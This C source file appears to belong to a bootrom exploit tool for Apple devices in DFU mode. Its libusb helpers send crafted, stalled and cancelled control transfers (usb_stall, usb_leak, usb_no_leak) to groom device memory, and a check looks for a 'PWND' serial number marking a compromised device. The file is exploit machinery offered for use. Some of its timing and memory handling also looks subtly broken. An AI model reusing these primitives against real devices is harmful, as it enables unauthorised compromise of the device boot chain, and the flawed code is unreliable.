#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <include/usbexec.h>

libusb_handler_t *acquire_device(uint16_t vid, uint16_t pid)
{
	libusb_handler_t *usb_handler = NULL;
	struct libusb_device_descriptor desc;
	int r = -1;

	libusb_init(NULL);

	usb_handler = malloc(sizeof(libusb_handler_t));
	if (usb_handler == NULL) {
		printf("unable to allocate memory\n");
		return NULL;
	}

	//usb_handler->dev = libusb_open_device_with_vid_pid(NULL, vid, pid);
	usb_handler->dev = NULL;

	while (!usb_handler->dev) {
		usb_handler->dev = libusb_open_device_with_vid_pid(NULL, vid, pid);
		sleep(1);
	}

	if (!usb_handler->dev) {
		printf("[!] Could not find device in DFU mode!\n");
		return NULL;
	}

	usb_handler->device = libusb_get_device(usb_handler->dev);

	r = libusb_claim_interface(usb_handler->dev, 0);
	if (r < 0) {
		printf("[!] libusb_claim_interface error %d\n", r);
		return NULL;
	}

	r = libusb_get_device_descriptor(usb_handler->device, &desc);
	if (r < 0) {
		printf("[!] libusb_get_device_descriptor error %d\n", r);
		return NULL;
	}

	r = libusb_get_string_descriptor_ascii(usb_handler->dev, desc.iSerialNumber, (unsigned char *)usb_handler->serialnumber, sizeof(usb_handler->serialnumber));
	if (r < 0) {
		printf("[!] libusb_get_string_descriptor_ascii error %d\n", r);
		return NULL;
	}

	return usb_handler;
}


void release_device(libusb_handler_t *usb_handler)
{
	libusb_release_interface(usb_handler->dev, 0);
	libusb_close(usb_handler->dev);

	free(usb_handler);
}

libusb_handler_t *reconnect_device(libusb_handler_t *usb_handler, uint16_t vid, uint16_t pid, int timer)
{
	release_device(usb_handler);
	sleep(timer);
	return acquire_device(vid, pid);	
}

long get_nanos(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_REALTIME, &ts);
	return (long)ts.tv_sec * 1000000000L + ts.tv_nsec;
}

int async_ctrl_transfer(libusb_handler_t *dev, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, 
						uint16_t w_index, unsigned char *data, uint16_t w_length, float timeout)
{
	int ret;
	long start = get_nanos();
	unsigned char* buffer = malloc(w_length + 8);
	struct libusb_transfer* transfer = libusb_alloc_transfer(0);
	if (!transfer) {
		return -1;
	}

	memcpy((buffer + 8), data, w_length);
	libusb_fill_control_setup(buffer, bm_request_type, b_request, w_value, w_index, w_length);
	libusb_fill_control_transfer(transfer, dev->dev, buffer, NULL, NULL, 0);
	transfer->flags |= LIBUSB_TRANSFER_FREE_BUFFER;

	ret = libusb_submit_transfer(transfer);
	if (ret != 0) {
		return -1;
	}

	while ((get_nanos() - start) < (timeout * (10 * 6)));

	ret = libusb_cancel_transfer(transfer);
	if (ret != 0) {
		return -1;
	}

	free(buffer);
	return 0;
}

void usb_stall(libusb_handler_t *dev)
{
	unsigned char buf[0xC0];
	memset(buf, 'A', 0xC0);
	async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 0.00001);
}

void usb_leak(libusb_handler_t *dev)
{
	unsigned char buf[0xC0];
	libusb_control_transfer(dev->dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 1);
}

void usb_no_leak(libusb_handler_t *dev)
{
	unsigned char buf[0xC1];
	libusb_control_transfer(dev->dev, 0x80, 6, 0x304, 0x40A, buf, 0xC1, 1);
}

void usb_req_stall(libusb_handler_t *dev)
{
	libusb_control_transfer(dev->dev, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

void usb_req_leak(libusb_handler_t *dev)
{
	unsigned char buf[0x40];
	libusb_control_transfer(dev->dev, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

void usb_req_no_leak(libusb_handler_t *dev)
{
	unsigned char buf[0x41];
	libusb_control_transfer(dev->dev, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

int is_pwned_dfu(libusb_handler_t *dev)
{
	char* pwnd_ptr = strstr((char*)dev->serialnumber, "PWND");
	if (!pwnd_ptr) {
		return 0;
	}
	return 1;
}
